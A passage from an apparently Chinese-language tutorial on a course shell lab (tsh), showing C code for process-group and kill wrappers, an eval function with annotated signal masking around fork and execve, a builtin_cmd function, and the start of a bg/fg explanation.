</span><span id=__span-144-54><a id=__codelineno-144-54 name=__codelineno-144-54></a><span class=kt>void</span><span class=w> </span><span class=nf>Setpgid</span><span class=p>(</span><span class=kt>pid_t</span><span class=w> </span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=kt>pid_t</span><span class=w> </span><span class=n>pgid</span><span class=p>)</span>
</span><span id=__span-144-55><a id=__codelineno-144-55 name=__codelineno-144-55></a><span class=p>{</span>
</span><span id=__span-144-56><a id=__codelineno-144-56 name=__codelineno-144-56></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>setpgid</span><span class=p>(</span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=n>pgid</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-144-57><a id=__codelineno-144-57 name=__codelineno-144-57></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-144-58><a id=__codelineno-144-58 name=__codelineno-144-58></a><span class=w>        </span><span class=n>unix_error</span><span class=p>(</span><span class=s>"Setpid error"</span><span class=p>);</span>
</span><span id=__span-144-59><a id=__codelineno-144-59 name=__codelineno-144-59></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-144-60><a id=__codelineno-144-60 name=__codelineno-144-60></a><span class=p>}</span>
</span><span id=__span-144-61><a id=__codelineno-144-61 name=__codelineno-144-61></a><span class=kt>void</span><span class=w> </span><span class=nf>Kill</span><span class=p>(</span><span class=kt>pid_t</span><span class=w> </span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>sig</span><span class=p>)</span>
</span><span id=__span-144-62><a id=__codelineno-144-62 name=__codelineno-144-62></a><span class=p>{</span>
</span><span id=__span-144-63><a id=__codelineno-144-63 name=__codelineno-144-63></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>kill</span><span class=p>(</span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=n>sig</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-144-64><a id=__codelineno-144-64 name=__codelineno-144-64></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-144-65><a id=__codelineno-144-65 name=__codelineno-144-65></a><span class=w>        </span><span class=n>unix_error</span><span class=p>(</span><span class=s>"Kill error"</span><span class=p>);</span>
</span><span id=__span-144-66><a id=__codelineno-144-66 name=__codelineno-144-66></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-144-67><a id=__codelineno-144-67 name=__codelineno-144-67></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=eval>eval<a class=headerlink href=#eval title="Permanent link">¶</a></h3> <p>这个函数功能是解析命令行后判断为内置命令还是程序路径，分别执行。如果是前台作业，则要等待其完成，如果是后台作业，则要输出其相应信息：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-145-1> 1</a></span>
<span class=normal><a href=#__codelineno-145-2> 2</a></span>
<span class=normal><a href=#__codelineno-145-3> 3</a></span>
<span class=normal><a href=#__codelineno-145-4> 4</a></span>
<span class=normal><a href=#__codelineno-145-5> 5</a></span>
<span class=normal><a href=#__codelineno-145-6> 6</a></span>
<span class=normal><a href=#__codelineno-145-7> 7</a></span>
<span class=normal><a href=#__codelineno-145-8> 8</a></span>
<span class=normal><a href=#__codelineno-145-9> 9</a></span>
<span class=normal><a href=#__codelineno-145-10>10</a></span>
<span class=normal><a href=#__codelineno-145-11>11</a></span>
<span class=normal><a href=#__codelineno-145-12>12</a></span>
<span class=normal><a href=#__codelineno-145-13>13</a></span>
<span class=normal><a href=#__codelineno-145-14>14</a></span>
<span class=normal><a href=#__codelineno-145-15>15</a></span>
<span class=normal><a href=#__codelineno-145-16>16</a></span>
<span class=normal><a href=#__codelineno-145-17>17</a></span>
<span class=normal><a href=#__codelineno-145-18>18</a></span>
<span class=normal><a href=#__codelineno-145-19>19</a></span>
<span class=normal><a href=#__codelineno-145-20>20</a></span>
<span class=normal><a href=#__codelineno-145-21>21</a></span>
<span class=normal><a href=#__codelineno-145-22>22</a></span>
<span class=normal><a href=#__codelineno-145-23>23</a></span>
<span class=normal><a href=#__codelineno-145-24>24</a></span>
<span class=normal><a href=#__codelineno-145-25>25</a></span>
<span class=normal><a href=#__codelineno-145-26>26</a></span>
<span class=normal><a href=#__codelineno-145-27>27</a></span>
<span class=normal><a href=#__codelineno-145-28>28</a></span>
<span class=normal><a href=#__codelineno-145-29>29</a></span>
<span class=normal><a href=#__codelineno-145-30>30</a></span>
<span class=normal><a href=#__codelineno-145-31>31</a></span>
<span class=normal><a href=#__codelineno-145-32>32</a></span>
<span class=normal><a href=#__codelineno-145-33>33</a></span>
<span class=normal><a href=#__codelineno-145-34>34</a></span>
<span class=normal><a href=#__codelineno-145-35>35</a></span>
<span class=normal><a href=#__codelineno-145-36>36</a></span>
<span class=normal><a href=#__codelineno-145-37>37</a></span>
<span class=normal><a href=#__codelineno-145-38>38</a></span>
<span class=normal><a href=#__codelineno-145-39>39</a></span>
<span class=normal><a href=#__codelineno-145-40>40</a></span>
<span class=normal><a href=#__codelineno-145-41>41</a></span>
<span class=normal><a href=#__codelineno-145-42>42</a></span>
<span class=normal><a href=#__codelineno-145-43>43</a></span>
<span class=normal><a href=#__codelineno-145-44>44</a></span>
<span class=normal><a href=#__codelineno-145-45>45</a></span>
<span class=normal><a href=#__codelineno-145-46>46</a></span>
<span class=normal><a href=#__codelineno-145-47>47</a></span>
<span class=normal><a href=#__codelineno-145-48>48</a></span>
<span class=normal><a href=#__codelineno-145-49>49</a></span>
<span class=normal><a href=#__codelineno-145-50>50</a></span>
<span class=normal><a href=#__codelineno-145-51>51</a></span>
<span class=normal><a href=#__codelineno-145-52>52</a></span>
<span class=normal><a href=#__codelineno-145-53>53</a></span>
<span class=normal><a href=#__codelineno-145-54>54</a></span>
<span class=normal><a href=#__codelineno-145-55>55</a></span>
<span class=normal><a href=#__codelineno-145-56>56</a></span>
<span class=normal><a href=#__codelineno-145-57>57</a></span>
<span class=normal><a href=#__codelineno-145-58>58</a></span>
<span class=normal><a href=#__codelineno-145-59>59</a></span>
<span class=normal><a href=#__codelineno-145-60>60</a></span>
<span class=normal><a href=#__codelineno-145-61>61</a></span>
<span class=normal><a href=#__codelineno-145-62>62</a></span>
<span class=normal><a href=#__codelineno-145-63>63</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-145-1><a id=__codelineno-145-1 name=__codelineno-145-1></a><span class=cm>/* </span>
</span><span id=__span-145-2><a id=__codelineno-145-2 name=__codelineno-145-2></a><span class=cm>* eval - Evaluate the command line that the user has just typed in</span>
</span><span id=__span-145-3><a id=__codelineno-145-3 name=__codelineno-145-3></a><span class=cm>* </span>
</span><span id=__span-145-4><a id=__codelineno-145-4 name=__codelineno-145-4></a><span class=cm>* If the user has requested a built-in command (quit, jobs, bg or fg)</span>
</span><span id=__span-145-5><a id=__codelineno-145-5 name=__codelineno-145-5></a><span class=cm>* then execute it immediately. Otherwise, fork a child process and</span>
</span><span id=__span-145-6><a id=__codelineno-145-6 name=__codelineno-145-6></a><span class=cm>* run the job in the context of the child. If the job is running in</span>
</span><span id=__span-145-7><a id=__codelineno-145-7 name=__codelineno-145-7></a><span class=cm>* the foreground, wait for it to terminate and then return.  Note:</span>
</span><span id=__span-145-8><a id=__codelineno-145-8 name=__codelineno-145-8></a><span class=cm>* each child process must have a unique process group ID so that our</span>
</span><span id=__span-145-9><a id=__codelineno-145-9 name=__codelineno-145-9></a><span class=cm>* background children don't receive SIGINT (SIGTSTP) from the kernel</span>
</span><span id=__span-145-10><a id=__codelineno-145-10 name=__codelineno-145-10></a><span class=cm>* when we type ctrl-c (ctrl-z) at the keyboard.  </span>
</span><span id=__span-145-11><a id=__codelineno-145-11 name=__codelineno-145-11></a><span class=cm>*/</span>
</span><span id=__span-145-12><a id=__codelineno-145-12 name=__codelineno-145-12></a><span class=kt>void</span><span class=w> </span><span class=nf>eval</span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>cmdline</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-145-13><a id=__codelineno-145-13 name=__codelineno-145-13></a><span class=p>{</span>
</span><span id=__span-145-14><a id=__codelineno-145-14 name=__codelineno-145-14></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>argv</span><span class=p>[</span><span class=n>MAXARGS</span><span class=p>];</span><span class=w>        </span><span class=c1>// 存放解析的参数</span>
</span><span id=__span-145-15><a id=__codelineno-145-15 name=__codelineno-145-15></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>buf</span><span class=p>[</span><span class=n>MAXLINE</span><span class=p>];</span><span class=w>          </span><span class=c1>// 解析cmdline</span>
</span><span id=__span-145-16><a id=__codelineno-145-16 name=__codelineno-145-16></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>bg</span><span class=p>;</span><span class=w>                     </span><span class=c1>// 判断程序是前台还是后台执行</span>
</span><span id=__span-145-17><a id=__codelineno-145-17 name=__codelineno-145-17></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>state</span><span class=p>;</span><span class=w>                  </span><span class=c1>// 指示前台还是后台运行状态</span>
</span><span id=__span-145-18><a id=__codelineno-145-18 name=__codelineno-145-18></a><span class=w>    </span><span class=kt>pid_t</span><span class=w> </span><span class=n>pid</span><span class=p>;</span><span class=w>                  </span><span class=c1>// 执行程序的子进程的pid</span>
</span><span id=__span-145-19><a id=__codelineno-145-19 name=__codelineno-145-19></a>
</span><span id=__span-145-20><a id=__codelineno-145-20 name=__codelineno-145-20></a><span class=w>    </span><span class=n>strcpy</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>cmdline</span><span class=p>);</span><span class=w>   </span>
</span><span id=__span-145-21><a id=__codelineno-145-21 name=__codelineno-145-21></a><span class=w>    </span><span class=n>bg</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>parseline</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>argv</span><span class=p>);</span><span class=w>  </span><span class=c1>// 解析参数</span>
</span><span id=__span-145-22><a id=__codelineno-145-22 name=__codelineno-145-22></a><span class=w>    </span><span class=n>state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>bg</span><span class=o>?</span><span class=w> </span><span class=n>BG</span><span class=w> </span><span class=o>:</span><span class=w> </span><span class=n>FG</span><span class=p>;</span><span class=w>          </span>
</span><span id=__span-145-23><a id=__codelineno-145-23 name=__codelineno-145-23></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span><span class=w>        </span><span class=c1>// 空行，直接返回</span>
</span><span id=__span-145-24><a id=__codelineno-145-24 name=__codelineno-145-24></a><span class=w>        </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-145-25><a id=__codelineno-145-25 name=__codelineno-145-25></a><span class=w>    </span><span class=kt>sigset_t</span><span class=w> </span><span class=n>mask_all</span><span class=p>,</span><span class=w> </span><span class=n>mask_one</span><span class=p>,</span><span class=w> </span><span class=n>prev_one</span><span class=p>;</span>
</span><span id=__span-145-26><a id=__codelineno-145-26 name=__codelineno-145-26></a><span class=w>    </span><span class=n>Sigfillset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>mask_all</span><span class=p>);</span><span class=w>         </span><span class=c1>// 创建一个阻塞所有信号的掩码: mask_all, 即所有信号位都设置为1（阻塞状态）</span>
</span><span id=__span-145-27><a id=__codelineno-145-27 name=__codelineno-145-27></a><span class=w>    </span><span class=n>Sigemptyset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>mask_one</span><span class=p>);</span><span class=w>        </span><span class=c1>// 创建一个空掩码: mask_one, 即所有信号位都设置为0（不阻塞状态）</span>
</span><span id=__span-145-28><a id=__codelineno-145-28 name=__codelineno-145-28></a><span class=w>    </span><span class=n>Sigaddset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>mask_one</span><span class=p>,</span><span class=w> </span><span class=n>SIGCHLD</span><span class=p>);</span><span class=w> </span><span class=c1>// 在mask_one中添加SIGCHLD信号, 即创建一个只阻塞SIGCHLD信号的掩码</span>
</span><span id=__span-145-29><a id=__codelineno-145-29 name=__codelineno-145-29></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>builtin_cmd</span><span class=p>(</span><span class=n>argv</span><span class=p>))</span><span class=w>                                 </span><span class=c1>// 判断是否为内置命令，如果是内置命令，由builtin_cmd函数处理并返回true</span>
</span><span id=__span-145-30><a id=__codelineno-145-30 name=__codelineno-145-30></a><span class=w>    </span><span class=p>{</span><span class=w>                            </span>
</span><span id=__span-145-31><a id=__codelineno-145-31 name=__codelineno-145-31></a><span class=w>        </span><span class=n>Sigprocmask</span><span class=p>(</span><span class=n>SIG_BLOCK</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>mask_one</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>prev_one</span><span class=p>);</span><span class=w>       </span><span class=c1>// fork前阻塞SIGCHLD信号: 防止子进程在被添加到作业列表前终止</span>
</span><span id=__span-145-32><a id=__codelineno-145-32 name=__codelineno-145-32></a><span class=w>        </span><span class=c1>// 子进程可能在父进程将其添加到作业列表(addjob)之前就已经执行完毕并终止</span>
</span><span id=__span-145-33><a id=__codelineno-145-33 name=__codelineno-145-33></a><span class=w>        </span><span class=c1>// 此时子进程终止会触发 SIGCHLD 信号</span>
</span><span id=__span-145-34><a id=__codelineno-145-34 name=__codelineno-145-34></a><span class=w>        </span><span class=c1>// 信号处理器会处理这个终止的子进程，但由于该进程尚未添加到作业列表中，信号处理器无法识别和正确处理它</span>
</span><span id=__span-145-35><a id=__codelineno-145-35 name=__codelineno-145-35></a><span class=w>        </span><span class=c1>// 这将导致僵尸进程的产生，或者作业状态管理出现混乱</span>
</span><span id=__span-145-36><a id=__codelineno-145-36 name=__codelineno-145-36></a><span class=w>        </span><span class=c1>// 因此，原子的作业创建流程是：创建子进程 -&gt; 将子进程添加到作业列表 -&gt; 开始跟踪其状态</span>
</span><span id=__span-145-37><a id=__codelineno-145-37 name=__codelineno-145-37></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Fork</span><span class=p>())</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w>                            </span><span class=c1>// 创建子进程, 拷贝父进程地址空间的完整副本，包括信号掩码这些变量</span>
</span><span id=__span-145-38><a id=__codelineno-145-38 name=__codelineno-145-38></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-145-39><a id=__codelineno-145-39 name=__codelineno-145-39></a><span class=w>            </span><span class=n>Sigprocmask</span><span class=p>(</span><span class=n>SIG_SETMASK</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>prev_one</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span><span class=w>      </span><span class=c1>// 解除子进程的阻塞：子进程作为一个独立的进程，需要能够响应所有正常的信号，注意这只影响子进程的信号掩码，不会影响父进程的信号掩码</span>
</span><span id=__span-145-40><a id=__codelineno-145-40 name=__codelineno-145-40></a><span class=w>            </span><span class=n>Setpgid</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w>                                  </span><span class=c1>// 创建新进程组，ID设置为进程PID，这里主要是为了将子进程组与 tsh 进程组分开，防止发信号终止子进程组时也将 tsh 进程组终止了</span>
</span><span id=__span-145-41><a id=__codelineno-145-41 name=__codelineno-145-41></a><span class=w>            </span><span class=n>Execve</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=n>argv</span><span class=p>,</span><span class=w> </span><span class=n>environ</span><span class=p>);</span><span class=w>                 </span><span class=c1>// 执行</span>
</span><span id=__span-145-42><a id=__codelineno-145-42 name=__codelineno-145-42></a><span class=w>            </span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span><span class=w>                                        </span><span class=c1>// 子进程执行完毕后一定要退出，此时子进程完全终止了</span>
</span><span id=__span-145-43><a id=__codelineno-145-43 name=__codelineno-145-43></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-145-44><a id=__codelineno-145-44 name=__codelineno-145-44></a><span class=w>        </span><span class=c1>// 以下代码只有父进程会执行, fork在子进程中返回0，在父进程中返回子进程的pid，因此以下pid为子进程的pid</span>
</span><span id=__span-145-45><a id=__codelineno-145-45 name=__codelineno-145-45></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>state</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>FG</span><span class=p>)</span>
</span><span id=__span-145-46><a id=__codelineno-145-46 name=__codelineno-145-46></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-145-47><a id=__codelineno-145-47 name=__codelineno-145-47></a><span class=w>            </span><span class=n>Sigprocmask</span><span class=p>(</span><span class=n>SIG_BLOCK</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>mask_all</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span><span class=w>            </span><span class=c1>// 添加工作前阻塞所有信号(确保原子操作)</span>
</span><span id=__span-145-48><a id=__codelineno-145-48 name=__codelineno-145-48></a><span class=w>            </span><span class=n>addjob</span><span class=p>(</span><span class=n>jobs</span><span class=p>,</span><span class=w> </span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=n>state</span><span class=p>,</span><span class=w> </span><span class=n>cmdline</span><span class=p>);</span><span class=w>                  </span><span class=c1>// 添加至作业列表</span>
</span><span id=__span-145-49><a id=__codelineno-145-49 name=__codelineno-145-49></a><span class=w>            </span><span class=n>Sigprocmask</span><span class=p>(</span><span class=n>SIG_SETMASK</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>mask_one</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span><span class=w>          </span><span class=c1>// 恢复为只阻塞SIGCHLD的状态</span>
</span><span id=__span-145-50><a id=__codelineno-145-50 name=__codelineno-145-50></a><span class=w>            </span><span class=n>waitfg</span><span class=p>(</span><span class=n>pid</span><span class=p>);</span><span class=w>                                        </span><span class=c1>// 等待前台进程执行完毕</span>
</span><span id=__span-145-51><a id=__codelineno-145-51 name=__codelineno-145-51></a><span class=w>        </span><span class=p>}</span><span class=w>         </span>
</span><span id=__span-145-52><a id=__codelineno-145-52 name=__codelineno-145-52></a><span class=w>        </span><span class=k>else</span>
</span><span id=__span-145-53><a id=__codelineno-145-53 name=__codelineno-145-53></a><span class=w>        </span><span class=p>{</span>
</span><span id=__span-145-54><a id=__codelineno-145-54 name=__codelineno-145-54></a><span class=w>            </span><span class=n>Sigprocmask</span><span class=p>(</span><span class=n>SIG_BLOCK</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>mask_all</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span><span class=w>            </span><span class=c1>// 添加工作前阻塞所有信号(确保原子操作)</span>
</span><span id=__span-145-55><a id=__codelineno-145-55 name=__codelineno-145-55></a><span class=w>            </span><span class=n>addjob</span><span class=p>(</span><span class=n>jobs</span><span class=p>,</span><span class=w> </span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=n>state</span><span class=p>,</span><span class=w> </span><span class=n>cmdline</span><span class=p>);</span><span class=w>                  </span><span class=c1>// 添加至作业列表</span>
</span><span id=__span-145-56><a id=__codelineno-145-56 name=__codelineno-145-56></a><span class=w>            </span><span class=n>Sigprocmask</span><span class=p>(</span><span class=n>SIG_SETMASK</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>mask_one</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span><span class=w>          </span><span class=c1>// 恢复为只阻塞SIGCHLD的状态</span>
</span><span id=__span-145-57><a id=__codelineno-145-57 name=__codelineno-145-57></a><span class=w>            </span><span class=c1>// printf函数是线程不安全的，比如可能会出现读内存的同时另一个线程修改它的情况，因此也需要阻塞信号</span>
</span><span id=__span-145-58><a id=__codelineno-145-58 name=__codelineno-145-58></a><span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=s>"[%d] (%d) %s"</span><span class=p>,</span><span class=w> </span><span class=n>pid2jid</span><span class=p>(</span><span class=n>pid</span><span class=p>),</span><span class=w> </span><span class=n>pid</span><span class=p>,</span><span class=w> </span><span class=n>cmdline</span><span class=p>);</span><span class=w> </span><span class=c1>// 打印后台进程信息</span>
</span><span id=__span-145-59><a id=__codelineno-145-59 name=__codelineno-145-59></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-145-60><a id=__codelineno-145-60 name=__codelineno-145-60></a><span class=w>        </span><span class=n>Sigprocmask</span><span class=p>(</span><span class=n>SIG_SETMASK</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>prev_one</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span><span class=w>              </span><span class=c1>// 解除阻塞，恢复到fork前的原始信号掩码状态（即prev_one）</span>
</span><span id=__span-145-61><a id=__codelineno-145-61 name=__codelineno-145-61></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-145-62><a id=__codelineno-145-62 name=__codelineno-145-62></a><span class=w>    </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-145-63><a id=__codelineno-145-63 name=__codelineno-145-63></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=builtin_cmd>builtin_cmd<a class=headerlink href=#builtin_cmd title="Permanent link">¶</a></h3> <p>这个函数就是简简单单判断是否为内置命令：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-146-1> 1</a></span>
<span class=normal><a href=#__codelineno-146-2> 2</a></span>
<span class=normal><a href=#__codelineno-146-3> 3</a></span>
<span class=normal><a href=#__codelineno-146-4> 4</a></span>
<span class=normal><a href=#__codelineno-146-5> 5</a></span>
<span class=normal><a href=#__codelineno-146-6> 6</a></span>
<span class=normal><a href=#__codelineno-146-7> 7</a></span>
<span class=normal><a href=#__codelineno-146-8> 8</a></span>
<span class=normal><a href=#__codelineno-146-9> 9</a></span>
<span class=normal><a href=#__codelineno-146-10>10</a></span>
<span class=normal><a href=#__codelineno-146-11>11</a></span>
<span class=normal><a href=#__codelineno-146-12>12</a></span>
<span class=normal><a href=#__codelineno-146-13>13</a></span>
<span class=normal><a href=#__codelineno-146-14>14</a></span>
<span class=normal><a href=#__codelineno-146-15>15</a></span>
<span class=normal><a href=#__codelineno-146-16>16</a></span>
<span class=normal><a href=#__codelineno-146-17>17</a></span>
<span class=normal><a href=#__codelineno-146-18>18</a></span>
<span class=normal><a href=#__codelineno-146-19>19</a></span>
<span class=normal><a href=#__codelineno-146-20>20</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-146-1><a id=__codelineno-146-1 name=__codelineno-146-1></a><span class=cm>/* </span>
</span><span id=__span-146-2><a id=__codelineno-146-2 name=__codelineno-146-2></a><span class=cm>* builtin_cmd - If the user has typed a built-in command then execute</span>
</span><span id=__span-146-3><a id=__codelineno-146-3 name=__codelineno-146-3></a><span class=cm>*    it immediately.  </span>
</span><span id=__span-146-4><a id=__codelineno-146-4 name=__codelineno-146-4></a><span class=cm>*/</span>
</span><span id=__span-146-5><a id=__codelineno-146-5 name=__codelineno-146-5></a><span class=kt>int</span><span class=w> </span><span class=nf>builtin_cmd</span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=o>**</span><span class=n>argv</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-146-6><a id=__codelineno-146-6 name=__codelineno-146-6></a><span class=p>{</span>
</span><span id=__span-146-7><a id=__codelineno-146-7 name=__codelineno-146-7></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=s>"quit"</span><span class=p>))</span>
</span><span id=__span-146-8><a id=__codelineno-146-8 name=__codelineno-146-8></a><span class=w>        </span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span><span id=__span-146-9><a id=__codelineno-146-9 name=__codelineno-146-9></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=s>"bg"</span><span class=p>)</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=s>"fg"</span><span class=p>))</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-146-10><a id=__codelineno-146-10 name=__codelineno-146-10></a><span class=w>        </span><span class=n>do_bgfg</span><span class=p>(</span><span class=n>argv</span><span class=p>);</span>
</span><span id=__span-146-11><a id=__codelineno-146-11 name=__codelineno-146-11></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-146-12><a id=__codelineno-146-12 name=__codelineno-146-12></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-146-13><a id=__codelineno-146-13 name=__codelineno-146-13></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=s>"jobs"</span><span class=p>))</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-146-14><a id=__codelineno-146-14 name=__codelineno-146-14></a><span class=w>        </span><span class=n>listjobs</span><span class=p>(</span><span class=n>jobs</span><span class=p>);</span>
</span><span id=__span-146-15><a id=__codelineno-146-15 name=__codelineno-146-15></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-146-16><a id=__codelineno-146-16 name=__codelineno-146-16></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-146-17><a id=__codelineno-146-17 name=__codelineno-146-17></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=s>"&amp;"</span><span class=p>))</span>
</span><span id=__span-146-18><a id=__codelineno-146-18 name=__codelineno-146-18></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-146-19><a id=__codelineno-146-19 name=__codelineno-146-19></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w>     </span><span class=cm>/* not a builtin command */</span>
</span><span id=__span-146-20><a id=__codelineno-146-20 name=__codelineno-146-20></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=do_bgfg>do_bgfg<a class=headerlink href=#do_bgfg title="Permanent link">¶</a></h3> <p>这个函数要实现内置命令<code>bg</code>和<code>fg</code>，这两个命令的功能如下：</p> <ul> <li><code>bg &lt;job&gt;</code>：通过向<job>对应的作业发送SIGCONT信号来使它重启并放在后台运行</job></li> <li><code>fg &lt;job&gt;</code>：通过向 <job>对应的作业发送SIGCONT信号来使它重启并放在前台运行</job></li> <li>输入时后面的参数有%则代表jid，没有则代表pid</li> </ul> <p>trace14主要就是用来测试这个命令，查看标准程序的输出：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-147-1> 1</a></span>
<span class=normal><a href=#__codelineno-147-2> 2</a></span>
<span class=normal><a href=#__codelineno-147-3> 3</a></span>
<span class=normal><a href=#__codelineno-147-4> 4</a></span>
<span class=normal><a href=#__codelineno-147-5> 5</a></span>
<span class=normal><a href=#__codelineno-147-6> 6</a></span>
<span class=normal><a href=#__codelineno-147-7> 7</a></span>
<span class=normal><a href=#__codelineno-147-8> 8</a></span>
<span class=normal><a href=#__codelineno-147-9> 9</a></span>
<span class=normal><a href=#__codelineno-147-10>10</a></span>
<span class=normal><a href=#__codelineno-147-11>11</a></span>
<span class=normal><a href=#__codelineno-147-12>12</a></span>
<span class=normal><a href=#__codelineno-147-13>13</a></span>
<span class=normal><a href=#__codelineno-147-14>14</a></span>
<span class=normal><a href=#__codelineno-147-15>15</a></span>
<span class=normal><a href=#__codelineno-147-16>16</a></span>
<span class=normal><a href=#__codelineno-147-17>17</a></span>
<span class=normal><a href=#__codelineno-147-18>18</a></span>
<span class=normal><a href=#__codelineno-147-19>19</a></span>
<span class=normal><a href=#__codelineno-147-20>20</a></span>
<span class=normal><a href=#__codelineno-147-21>21</a></span>
<span class=normal><a href=#__codelineno-147-22>22</a></span>
<span class=normal><a href=#__codelineno-147-23>23</a></span>
<span class=normal><a href=#__codelineno-147-24>24</a></span>
<span class=normal><a href=#__codelineno-147-25>25</a></span>
<span class=normal><a href=#__codelineno-147-26>26</a></span>
